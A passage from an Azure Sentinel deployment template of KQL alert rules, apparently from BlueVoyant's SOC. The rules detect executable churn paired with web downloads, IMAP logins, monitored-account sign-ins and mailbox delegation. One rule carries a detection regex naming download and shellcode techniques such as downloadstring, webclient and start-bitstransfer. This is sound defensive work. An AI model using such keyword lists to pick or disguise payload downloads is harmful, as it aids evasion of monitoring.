\nlet fileOperations =\nDeviceFileEvents\n    | where TimeGenerated > ago(start_time) and TimeGenerated < end_time  \n    | where ActionType in~ ('FileCreated', 'FileDeleted')\n    | where FileName matches regex @\".*\\.exe$\"\n    | where not(InitiatingProcessCommandLine has_any (global_config['commandLineExclusions']))\n    | where not(InitiatingProcessFileName in~ (global_config['processNameExclusions']))\n    | summarize FileEventCount = count(), createdFiles = make_set(FileName, 10), StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), AccountName = make_set(RequestAccountName, 10) by DeviceId, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessVersionInfoCompanyName\n    | where FileEventCount > global_config['THRESHOLD'];\nlet networkOperations =  \n    DeviceNetworkEvents\n    | where TimeGenerated > ago(start_time) and TimeGenerated < end_time  \n    | where isnotempty(RemoteUrl) and (tolower(InitiatingProcessFileName) matches regex 'curl|wget' or (InitiatingProcessCommandLine has 'Invoke-WebRequest' and tolower(InitiatingProcessCommandLine) matches regex @'(?i)http|system.net.sockets.tcpclient|webclient|downloadfile|downloaddata|downloadstring|webrequest|shellcode|start-bitstransfer|mpcmdrun.exe'))\n    | where not(InitiatingProcessCommandLine has_any (global_config['commandLineExclusions']))\n    | where not(InitiatingProcessFileName in~ (global_config['processNameExclusions']))\n    | where not(RemoteUrl has_any (global_config['remoteURLExclusions']))\n    | project DeviceId, RemoteUrl, InitiatingProcessFileName, NetworkCommandLine = InitiatingProcessCommandLine;\nlet unpackingProcessEvents = DeviceProcessEvents\n    | where TimeGenerated > ago(start_time) and TimeGenerated < end_time    \n    | where InitiatingProcessFileName in~ (global_config['unpackingTools'])\n    | where not(InitiatingProcessCommandLine has_any (global_config['commandLineExclusions'])) and not(InitiatingProcessFileName in~ (global_config['processNameExclusions']))\n    | project DeviceId, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessVersionInfoCompanyName;\nfileOperations\n| join kind=inner unpackingProcessEvents on DeviceId, InitiatingProcessFileName\n| join kind=inner networkOperations on DeviceId, InitiatingProcessFileName\n| summarize\n      bv_event_count = sum(FileEventCount),\n      bv_file_name = make_set(createdFiles, 10),\n      bv_url = make_set(RemoteUrl, 10),\n      bv_process_command_line = make_set(NetworkCommandLine, 10),\n      bv_start_time = take_any(StartTime),\n      bv_end_time = take_any(EndTime),\n      bv_user = make_set(AccountName, 10),\n      bv_src_dvc = make_set(DeviceName, 10)\n    by bv_src_dvc_id = DeviceId, bv_parent_process = InitiatingProcessFileName, bv_parent_process_command_line = InitiatingProcessCommandLine, bv_parent_process_version_info_company = InitiatingProcessVersionInfoCompanyName\n| invoke match(exclusions, 'exclusion')\n| where match_status != 'exclusion'\n| invoke description(excluded_description_fields, 300, 5)\n| extend bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)\n| invoke calc_dedup_hash(excluded_dedup_fields)\n| where BV_FUN_DEDUP(alert_id,ago(start_time_suppress)) !has bv_dedup_hash              \n| extend \n    bv_alarm_attacker_entities = array_concat(pack_array(bv_src_dvc_id), bv_user)          \n    , bv_mapping_tag = bv_src_dvc_id\n    , bv_user1 = bv_user[0]\n    , bv_src_dvc1 = bv_src_dvc[0]\n| project-keep bv_*, ExtendedDescription",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT47H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "PrivilegeEscalation",
            "Discovery",
            "Execution"
          ],
          "techniques": [
            "T1055",
            "T1082",
            "T1036",
            "T1057",
            "T1083",
            "T1106"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-11505: [SOC] Defender - High Executable Activity and Outbound HTTP Requests on host {{bv_src_dvc_id}}",
            "alertDescriptionFormat": "This alert is designed to detect potentially malicious activity on a network by focusing on three key indicators: high volumes of executable file creation and deletion, outbound HTTP requests initiated by the \"curl\", \"wget\" or \"Invoke-WebRequest\" command, and the execution of common unpacking tools. These behaviors may signal malware activities, such as those associated with CoreWarrior, a persistent backdoor targeting Windows systems. First seen on MalwareBazaar in July 2022 and further analyzed by SonicWall in October 2024, CoreWarrior is notable for its rapid self-replication, creating up to 117 copies of itself within 10 minutes. By monitoring these indicators, the rule aims to provide comprehensive insights into unusual or potentially harmful actions on a network.\n\n{{ExtendedDescription}}\n\ntag: SOC\nMITRE: T1055 MITRE: T1082 MITRE: T1036 MITRE: T1057 MITRE: T1106"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "bvtag": "bv_mapping_tag",
            "AttackerEntity": "bv_alarm_attacker_entities"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_user1"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc1"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-30001')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-30001')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-30001: [SOC] XDR Incident Wrapper - Extended",
          "description": "Used to identify Microsoft Defender incidents that have been merged and renamed, and no longer contain their original incident details MITRE:  Category: SecurityAlert tag: SOC",
          "severity": "Informational",
          "enabled": true,
          "query": "let start_time = 7m;\nlet latency = 6h;\nlet end_time = now();\nlet start_time_historical=47h;\nlet alert_id = 'BV-30001';\nlet PreviousAlertIds = toscalar(\n  bv_split_security_alert\n  | where TimeGenerated >= ago(start_time_historical)\n  | where AlertName has alert_id\n  | extend OriginalAlertID = tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).[\"Custom Details\"])).IdentifiedAlertID))[0])\n  | parse AlertName with * ']' * '|' PrevIncidentName\n  |summarize OriginalAlertID=make_set_if(OriginalAlertID, isnotempty(OriginalAlertID)), PrevIncidentName=make_set_if(PrevIncidentName, isnotempty(PrevIncidentName))\n  | project IDs=array_concat(OriginalAlertID,PrevIncidentName)\n);      \nlet AlertDetails = bv_split_security_alert\n| where TimeGenerated >= ago(start_time + latency)\n| where ProductName in~ (\"Office 365 Advanced Threat Protection\", \"Azure Active Directory Identity Protection\", \"Microsoft Defender Advanced Threat Protection\", \"Microsoft Cloud App Security\", \"Azure Advanced Threat Protection\", \"Microsoft Data Loss Prevention\", \"Azure Security Center\", \"Microsoft Defender for Cloud\", \"MDC Agentless Antimalware\") and not(AlertType has_any ('CustomerTI', 'CustomDetection')) and not(AlertName has_any ('BV-', '[SOC]'))\n| where SystemAlertId !in (PreviousAlertIds) and not(AlertType has_any ('CustomerTI', 'CustomDetection'))\n| summarize AlertSev = make_set(AlertSeverity), Desc=make_set(Description) by SystemAlertId, AlertName, AlertLink;            \nSecurityIncident\n| where TimeGenerated >= ago(start_time + latency) and CreatedTime >= ago(start_time + latency) \n| where Title !startswith \"BV-\" and IncidentName !in (PreviousAlertIds)\n| mv-expand SystemAlertId = AlertIds\n| extend SystemAlertId = tostring(SystemAlertId)\n| join kind=inner AlertDetails on SystemAlertId\n| summarize arg_max(LastModifiedTime, *) by IncidentNumber      \n| where Status =~ 'New' and Comments !contains \"BlueVoyant SOC\" and Owner !contains \"BVSOC@blueteamglobal.com\" and ClassificationComment !contains \"BlueVoyant has investigated\" and ModifiedBy <> 'Fusion'\n| extend Desc = Desc[0]\n| extend AlertProductNames = parse_json(tostring(AdditionalData.alertProductNames))\n| where array_length(AlertProductNames) > 1 and (AlertProductNames has_any (\"Office 365 Advanced Threat Protection\", \"Microsoft Defender Advanced Threat Protection\", \"Microsoft Cloud App Security\", \"Azure Advanced Threat Protection\", \"Microsoft Data Loss Prevention\", \"Azure Security Center\", \"Microsoft Defender for Cloud\", \"MDC Agentless Antimalware\", \"Azure Active Directory Identity Protection\") and ProviderName != \"Azure Sentinel\") \n|extend first_product=tostring(AlertProductNames.[0]) \n|where first_product !has 'Microsoft Data Loss Prevention' and not((array_length(AlertProductNames) == 2) and AlertProductNames contains 'Sentinel')\n| project TimeGenerated, AlertName, Title, IncidentNumber, IncidentName, IncidentUrl, AlertIds, Status, Comments, Classification, ClassificationComment, SystemAlertId, Severity = AlertSev, Desc, AlertLink, ProviderName, AlertProductNames",
          "queryFrequency": "PT7M",
          "queryPeriod": "PT47H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-30001: [SOC] {{AlertName}} {{SystemAlertId}}|{{IncidentName}}",
            "alertDescriptionFormat": "{{Title}}\n\n{{Desc}}\n\nAlert link: {{AlertLink}}"
          },
          "customDetails": {
            "IdentifiedAlertID": "SystemAlertId"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      }
    ]
  },
  {
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "parameters": {
      "workspace": {
        "type": "String"
      }
    },
    "resources": [
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2600')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2600')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2600: [RBA] Azure AD - Successful Login Where IMAP Service is Disabled",
          "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nThis rule identifies when a user has successfully logged into the IMAP service which has been disabled and not in use for this customer.\n\nInclusion: A2600_IMAP_DISABLED (True if the customer disabled the IMAP services, False if IMAP is enabled.)\nExclusion: A2600_EXCLUDED_ACCOUNTNAMES (Translucent whitelist for accounts allowed legacy auth.  This will appear in your BV - Hygiene Advisory workbook.)\n\nConsiderations:\n1. Review account for additional activity from using \n2. Reset user password MITRE: T1078 Category: Entra ID tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let latency = 1d; // earliest [log time] boundary\nlet start_time = 4h; // earliest [ingest time] boundary\nlet alert_bin = 4h;\n//Join both exclusion lists\nlet ExcludedAccounts = array_concat(A2600_EXCLUDED_ACCOUNTNAMES,A2600_EXCLUDED_UPN);\n//only fire on successful logins within the past 2 hours where has not been seen for 1 day.\n//This prevents duplicates if the account password is reset within 1 day.\nSigninLogs\n|where TimeGenerated between (ago(latency + start_time) .. now()) and ingestion_time() > ago(start_time)\n| where ClientAppUsed =~ 'IMAP4'\n| where tobool(A2600_IMAP_DISABLED)\n| where ConditionalAccessStatus =~ 'success'\n| summarize EventCount=count(), MinTime=min(TimeGenerated) by UserPrincipalName, IPAddress, UserAgent, bin(TimeGenerated, alert_bin)\n| sort by UserPrincipalName, TimeGenerated\n| where MinTime > ago(start_time)\n//throttle max events to the soc by limiting to the worst 20 offenders.\n//especially since Sentinel limits the number of alerts to 20 per run.\n| sort by EventCount desc\n| parse UserPrincipalName with AccountName '@' AccountUPNSuffix\n| extend ExcludedAccountName = iif(UserPrincipalName in~ (ExcludedAccounts), true, false) \n| extend ExcludedAccountName = iif(AccountName in~ (ExcludedAccounts), true, ExcludedAccountName)\n| extend ExcludedAccountName = iif(AccountName matches regex A2600_EXCLUDED_ACCOUNT_REGEX, true, ExcludedAccountName)    \n//if allowed then make class a Hygiene.\n| extend Class = 'RBA'\n| extend Tags = 'tag: RBA'\n| extend AlertSeverity = iif(Class == 'SOC', 'High', 'Low')\n| extend ExtendedDescription = strcat(UserPrincipalName, ' has successfully logged into AAD for IMAP from source IP ', IPAddress, '.\\n Search: \\nSigninLogs\\n|where Timegenerated between(ago(', latency + start_time, ') .. now()\\n| where ClientAppUsed =~ \"IMAP4\"\\n| where UserPrincipalName =~ ', UserPrincipalName )\n| project\n    EventCount,\n    UserPrincipalName,\n    AccountName,\n    AccountUPNSuffix,\n    IPAddress,\n    UserAgent,\n    Class,\n    Tags,\n    AlertSeverity,\n    ExtendedDescription,\n    TimeGenerated",
          "queryFrequency": "PT4H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "IP"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-2600: [RBA] Azure AD - {{UserPrincipalName}} successful IMAP login",
            "alertDescriptionFormat": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nThis rule identifies when a user has successfully logged into the IMAP service which has been disabled and not in use for this customer.\n\n\n{{ExtendedDescription}}\n\nInclusion: A2600_IMAP_DISABLED (True if the customer disabled the IMAP services, False if IMAP is enabled.)\nExclusion: A2600_EXCLUDED_ACCOUNTNAMES (Translucent whitelist for accounts allowed legacy auth.  This will appear in your BV - Hygiene Advisory workbook.)\n\nConsiderations:\n1. Review account for additional activity from using \n2. Reset user password\n\nMITRE: T1078\nCategory: Azure AD \n{{Tags}}"
          },
          "customDetails": {
            "AttackerIP": "IPAddress"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "AccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2020')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2020')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2020: [RBA] Azure AD - Successful Logins for Monitored Accounts",
          "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nThis rule looks for successful logins in Azure AD for the specified accounts\n\nInclusions: A2020_USER_REGEX\n\nExclusions: None\n\nConsiderations:\n  1. Review and validate login MITRE: T1078 Category: Entra ID tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 1h;\nlet latency = 1h;\nlet alert_bin = 1h;\nunion isfuzzy=true (SigninLogs\n| where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n| where ResultType == 0\n| where UserPrincipalName matches regex A2020_USER_REGEX\n),\n(AADNonInteractiveUserSignInLogs\n| where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n| where ResultType == 0\n| where UserPrincipalName matches regex A2020_USER_REGEX\n)\n| parse UserPrincipalName with UserName '@' AccountFQDN\n| extend City = LocationDetails_dynamic['city']\n| extend State = LocationDetails_dynamic['state']\n| project TimeGenerated, Category, AuthenticationRequirement, IPAddress, UserPrincipalName, UserName, AccountFQDN, AppDisplayName, City, State\n| summarize \n    FirstTime = min(TimeGenerated)\n    , LastTime = max(TimeGenerated)\n    , Catergory = make_set(Category)\n    , AuthenticationRequirement = make_set(AuthenticationRequirement)\n    , SrcIPAddress = make_set(IPAddress)\n    , City=make_set(City)\n    , State=make_set(State)\n  by UserPrincipalName, UserName, AccountFQDN, bin_at(TimeGenerated, alert_bin, now())\n| extend ExtendedDescription = strcat(\n        'UserPrincipalName: ', UserPrincipalName\n        , '\\nIPAddresses: \\n* ', strcat_array(SrcIPAddress, '\\n* ')\n        ,'\\nCategory: \\n* ', strcat_array(Catergory, '\\n* ')\n        ,'\\nCity: \\n* ', strcat_array(City, '\\n* ')\n        ,'\\nState: \\n* ', strcat_array(State, '\\n* ')\n    )\n| extend IPAddress1 = SrcIPAddress[0], IPAddress2 = SrcIPAddress[1]\n| project TimeGenerated, FirstTime, LastTime, Catergory, AuthenticationRequirement, SrcIPAddress, City, State, UserPrincipalName, UserName, AccountFQDN, ExtendedDescription, IPAddress1, IPAddress2",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "P1D",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-2020: [RBA] Azure AD - Successful Logins for Monitored Account {{UserPrincipalName}}",
            "alertDescriptionFormat": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nThis rule looks for successful logins in Azure AD for the specified accounts\n\nInclusions: A2020_USER_REGEX\n\nExclusions: None\n\nConsiderations:\n  1. Review and validate login\n\n{{ExtendedDescription}}\n\nMITRE: T1078\nCategory: Azure AD\ntag: RBA"
          },
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress1"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress2"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "AccountFQDN"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-921')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-921')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-921: [Custom] MDC - Defender for Cloud",
          "description": "Defender for Cloud Applications (f.k.a. Azure Security Center)  \n\nReference: https://docs.microsoft.com/en-us/azure/security-center/alerts-reference\n\nInclusions: A921_ALERT_NAME_CUSTOMER_NOTIFICATIONS MITRE: T1565 Category: Microsoft Defender XDR tag: Custom",
          "severity": "High",
          "enabled": false,
          "query": "let start_time = 1h;\nlet latency= 1h;\nlet end_time = now();\nlet alert_bin = 1h;\nSecurityAlert\n| where TimeGenerated between (ago(latency + start_time) .. now()) and ingestion_time() > ago(start_time)\n| where A921_ALERT_NAME_CUSTOMER_NOTIFICATIONS !contains 'Default Rule Name'\n| where ProductName in~ ('Azure Security Center', 'Microsoft Defender for Cloud') and ProviderName =~ 'Azure Security Center'\n| where AlertName in (A921_ALERT_NAME_CUSTOMER_NOTIFICATIONS)\n| parse VendorOriginalId with IncidentID '_' AlertID\n//Extract data from Entities\n| extend ParsedEntities = parse_json(Entities)\n| mv-apply e = ParsedEntities on \n(\nextend ResourceID = iff(e.Type =~ 'azure-resource', e.ResourceId, '')\n| extend SrcIPAddress = iff(e.Type =~ 'ip', e.Address, '')\n| extend AccountObjectGuid = iff(e.Type =~ 'account', e.ObjectGuuid, '')\n| extend AccountName = iff(e.Type =~ 'account', e.Name, '')\n| extend HostName = iff(e.Type =~ 'host', e.HostName, '')\n| extend MalwareName = iff(e.Type =~ 'malware', e.Name, '')\n| extend FileName = iff(e.Type =~ 'file', e.Name, '')\n| extend FilePath = iff(e.Type =~ 'file', e.Directory, '')\n| summarize\n    SrcIPAddress=make_set_if(SrcIPAddress, isnotempty(SrcIPAddress))\n    , ResourceID=make_set_if(ResourceId, isnotempty(ResourceId))\n    , AccountObjectGuid=make_set_if(AccountObjectGuid, isnotempty(AccountObjectGuid))\n    , AccountName=make_set_if(AccountName, isnotempty(AccountName))\n    , HostName=make_set_if(HostName, isnotempty(HostName))\n    , FileName=make_set_if(FileName, isnotempty(FileName))\n    , FilePath=make_set_if(FilePath, isnotempty(FilePath))\n    , MalwareName=make_set_if(MalwareName, isnotempty(MalwareName))\n) \n| summarize Count=count()\n    , UniqueAlerts = dcount(AlertName)\n    , AlertNames=make_set(AlertName)\n    , Description=make_set(pack('Alertname', AlertName, 'Description', Description))\n    , SrcIPAddress=make_set_if(SrcIPAddress, isnotempty(SrcIPAddress))\n    , ResourceID=make_set_if(ResourceID, isnotempty(ResourceID))\n    , AccountObjectGuid=make_set_if(AccountObjectGuid, isnotempty(AccountObjectGuid))\n    , AccountName=make_set_if(AccountName, isnotempty(AccountName))\n    , VendorOriginalIds=make_set(VendorOriginalId)\n    , AlertLinks=make_set(AlertLink)\n    , AlertSeverity=make_set(AlertSeverity)\n    , ProductComponentNames = make_set(ProductComponentName)\n    , VendorIncidentIds = make_set(IncidentID)\n    , VendorAlertIds = make_set(AlertID)\n    , StartTime = min(StartTime)\n    , Files = make_set(FileName)\n    by \n    CompromisedEntity\n    , bin_at(TimeGenerated, alert_bin, now())\n    | extend ExtendedDescription = strcat(\n        'Azure Entity: ', CompromisedEntity\n        , ' \\nSample Incident Alerts: \\n* ', strcat_array(array_slice(Description, 0, 5), ' \\n* ')\n        , '  \\n\\nSample Links: \\n* ', strcat_array(array_slice(AlertLinks, 0, 5), '\\n* ')\n    )\n    | extend AlertName = iff(UniqueAlerts > 1, strcat('Multiple Defender for Cloud App alerts for ', CompromisedEntity), AlertNames[0])\n    | extend bv_rule_version = '1.1.5184'\n| extend bv_rule_timestamp = '1713373152.8516073'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.5184 bv_rule_timestamp: 1713373152.8516073'\n| project \n        UniqueAlerts\n        , AlertNames\n        , Description\n        , SrcIPAddress\n        , ResourceID    \n        , AccountObjectGuid \n        , AccountName   \n        , VendorOriginalIds \n        , AlertLinks\n        , AlertSeverity\n        , ProductComponentNames\n        , VendorIncidentIds\n        , VendorAlertIds\n        , StartTime\n        , Files\n        , CompromisedEntity\n        , ExtendedDescription\n        , AlertName\n        , bv_rule_combined_string",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [
            "T1565"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-921: [Custom] MDC - {{AlertName}}",
            "alertDescriptionFormat": "Defender for Cloud (f.k.a. Azure Security Center)\n\nReference: https://docs.microsoft.com/en-us/azure/security-center/alerts-reference\n\nMITRE: T1565\nCategory: Defender for Cloud\ntag: Custom\n\n{{ExtendedDescription}}\n\nAggregation: CompromisedEntity (Account) \n\nInclusions: A921_ALERT_NAME_CUSTOMER_NOTIFICATIONS   \n{{bv_rule_combined_string}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-879')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-879')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-879: [RBA] O365 - Unauthorized Access Delegation Of Monitored Mailboxes",
          "description": "Admin delegates access to a monitored mailbox that is not expected. An example could be access delegation of an executive's mailbox granted to themselves other than an executive assistant. MITRE: T1078,T1114 Category: Microsoft Defender XDR tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let start_time = 1h;\nlet start_time_historical = 7d;\nlet SignIn_UserEmail = SigninLogs\n| where TimeGenerated between (ago(start_time_historical) .. now())\n| where UserPrincipalName in~ (A879_MONITORED_MAILBOXES)\n| project TimeGenerated, UserPrincipalName, MailboxOwner = UserDisplayName\n;\nOfficeActivity\n| where TimeGenerated between (ago(start_time) .. now())\n| where Operation in~ ('Add-MailboxPermission', 'Remove-MailboxPermission')\n| where UserType == 'Admin'\n| mv-apply e=parse_json(Parameters) on \n(\n      extend MailboxOwner = iff(e.Name == 'Identity', e.Value, '')\n         , AssignedUser = iff(e.Name == 'User', e.Value, '')\n    | extend MailboxOwner = extract('([^//]+$)', 1, MailboxOwner)\n    | extend AssignedUser = extract('([^//]+$)', 1, AssignedUser)\n    | summarize MailboxOwner = make_set_if(MailboxOwner, isnotempty(MailboxOwner)), AssignedUser = make_set_if(AssignedUser, isnotempty(AssignedUser))\n)\n| extend MailboxOwner = tostring(MailboxOwner[0])\n       , AssignedUser = tostring(AssignedUser[0])\n| join kind=leftouter (SignIn_UserEmail) on MailboxOwner\n| where MailboxOwner  in (A879_MONITORED_MAILBOXES) or UserPrincipalName  in (A879_MONITORED_MAILBOXES)\n| summarize arg_max(TimeGenerated, *) by MailboxOwner, AssignedUser, Operation\n| where UserId contains UserPrincipalName\n| extend Actions = iff(Operation in~ ('Add-MailboxPermission'), 'added to', 'removed from')\n| extend ExtendedDescription = strcat('Access permission to the mailbox of ', MailboxOwner, ' was ', Actions, ' admin account ', UserId)\n| project TimeGenerated, ElevationTime, Operation, AssignedUser, MailboxOwner, MailboxOwnerEmail = UserPrincipalName, UserId, ClientIP, OriginatingServer, ExtendedDescription",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess",
            "Collection"
          ],
          "techniques": [
            "T1078",
            "T1114"
          ],
